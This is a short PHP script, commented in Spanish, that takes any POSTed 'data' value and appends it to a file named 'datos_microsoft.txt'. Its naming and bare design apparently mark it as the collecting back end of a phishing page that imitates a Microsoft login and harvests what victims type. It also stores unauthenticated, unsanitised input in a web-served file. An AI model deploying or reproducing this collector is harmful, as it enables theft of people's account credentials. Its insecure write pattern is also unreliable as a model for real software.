<?php
// save_data.php - Guardar datos en archivo TXT
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['data'])) {
    $data = $_POST['data'];
    
    // Nombre del archivo
    $filename = 'datos_microsoft.txt';
    
    // Guardar en el archivo (agregar al final)
    if (file_put_contents($filename, $data, FILE_APPEND | LOCK_EX)) {
        echo "Datos guardados exitosamente";
    } else {
        http_response_code(500);
        echo "Error guardando datos";
    }
} else {
    http_response_code(400);
    echo "Solicitud inválida";
}
?>